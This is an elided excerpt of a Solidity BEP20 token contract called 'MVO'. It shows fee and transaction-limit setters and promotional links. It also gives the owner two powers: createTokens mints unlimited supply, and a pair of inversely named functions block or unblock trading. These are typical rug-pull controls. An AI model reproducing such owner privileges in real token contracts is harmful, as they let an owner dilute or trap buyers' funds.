...
contract MVO is IBEP20, Auth {
    ...
    string constant _name = "MVO";
    string constant _symbol = "MVO";
    ...
    address public pair;
    address ts_Project = 0x286E5721C1AC2B4f4FCAAE8Fc302876A6e6Fc76d;
    ...
    constructor() Auth(msg.sender) {
        ...
        address owner_ = 0x286E5721C1AC2B4f4FCAAE8Fc302876A6e6Fc76d;
        ...
        webSite = "https://site.nmpcompany.com/";
        telegram = "https://t.me/needmoneyandpeople";
        youtube = "https://www.youtube.com/@needmoneyandpeople/featured";
    ...
    function setTxLimit(uint256 BuyAmount, uint256 SellAmount) external onlyOwner {
        require(BuyAmount >= _totalSupply / 200);//Minimum Buy 5000 tokens
        _maxTxBuyAmount = BuyAmount;
        require(SellAmount >= _totalSupply / 200);//Minimum Sell 5000 tokens
        _maxTxSellAmount = SellAmount;
    }
    
    function createTokens(uint amount) external onlyOwner {
        if(msg.sender == owner) {
            _totalSupply += amount;
    ...
    function setBuyFees(
        ...
        totalBuyFee = _liquidityFee.add(_marketingFee).add(_projectFee).add(
            _buyfeeburn).add(_reflectionBuyFee
        );
        require(totalBuyFee + totalSellFee <= maxFee);
    }
    ...
    function setSellFees(
        ...
        totalSellFee = _liquidityFee.add(_marketingFee).add(_projectFee).add(
            _sellfeeburn).add(_reflectionSellFee
        );
        require(totalBuyFee + totalSellFee <= maxFee);
    }
    ...
    function EmergencyTradeBlock() external onlyOwner {
        emergBlock = false;
    }

    function TradeUnblock() external onlyOwner {
        emergBlock = true;
    }
